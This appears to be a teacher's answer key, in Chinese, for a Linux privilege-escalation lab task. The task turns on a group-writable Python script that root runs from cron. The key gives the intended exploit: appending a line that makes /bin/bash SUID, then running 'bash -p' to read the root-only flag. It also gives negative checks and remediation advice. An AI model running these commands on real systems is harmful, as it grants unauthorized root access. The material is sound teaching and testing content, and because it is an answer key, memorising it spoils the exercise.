# 第 5 题（教师版）：服务脚本可写

> **唯一提权面**：`/opt/monitor/supervisor.py` 属主 `root:web`、权限 `664`；`player` 在 `web` 组；
> cron 每分钟以 **root** 执行 `python3 /opt/monitor/supervisor.py`。
> **唯一解**：向 `supervisor.py` 追加代码，把 `/bin/bash` 设为 SUID，等 cron 执行后 `bash -p`。
> **已刻意堵死**：`/etc/cron.d/monitor`、`/opt/monitor` 目录、`/opt/monitor/app.py`、`/var/log/monitor` 均不可写。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/opt/monitor/supervisor.py` | `root:web 0664` | **唯一提权面**，root 每分钟执行 |
| `/opt/monitor/app.py` | `root:root 0644` | 被监督的程序，只读 |
| `/opt/monitor`（目录） | `root:root 0755` | 不可写，不能替换文件 |
| `/etc/cron.d/monitor` | `root:root 0644` | `* * * * * root /usr/bin/python3 /opt/monitor/supervisor.py` |
| `/var/log/monitor/supervisor.log` | `root:root 0644` | 可读，用来观察执行时刻 |

`player`：uid 1001，附加组 `web`。

## 二、唯一解

```bash
id
# groups=1001(player),999(web)

ls -la /opt/monitor/
# -rw-rw-r-- 1 root web  supervisor.py    <-- 组可写

echo 'import os; os.system("chmod 4755 /bin/bash")' >> /opt/monitor/supervisor.py

# 等 1 分钟，观察日志时间：
tail -2 /var/log/monitor/supervisor.log

/bin/bash -p
id
cat /flag.txt
```

### 关键点讲解

- 这里的错误是**“负责人”和“执行者”不一致**：文件给 web 组写（为了协作），但执行者是 root。
- 与第 3 题（cron 脚本）同属“可写脚本”类，区别在于**这是服务/守护进程风格**、并且是本课“服务配置错误”的代表。
- 真实世界里的同类：`/usr/local/bin/*.py` 属组 www-data、systemd `ExecStart` 指向用户目录、`logrotate` 脚本可写等。
- 修复要点：脚本属主 root、权限 755；需要协作时用 `sudo` 或部署流水线，而不是开放组写。

## 三、为什么只有这一条解

| 思路 | 为什么失败 |
|---|---|
| 改 `app.py`（被监督对象） | 0644 root 属主，不可写；且 supervisor 只是“执行”它，不改其内容 |
| 改 `/etc/cron.d/monitor` | 0644 root，不可写 |
| 替换 `supervisor.py` 文件 | `/opt/monitor` 目录 755 root，不能删/换 |
| 写 `/var/log/monitor` | 目录 755 root，不可写 |
| 其他 SUID / sudo | 无预置异常项 |

## 四、单解验证

```bash
# 正向
echo 'import os; os.system("chmod 4755 /bin/bash")' >> /opt/monitor/supervisor.py
sleep 65
ls -l /bin/bash          # -rwsr-xr-x
/bin/bash -p -c 'id; cat /flag.txt'

# 负向
echo x >> /opt/monitor/app.py        # Permission denied
echo x >> /etc/cron.d/monitor        # Permission denied
mv /opt/monitor/supervisor.py /tmp/   # Permission denied
```
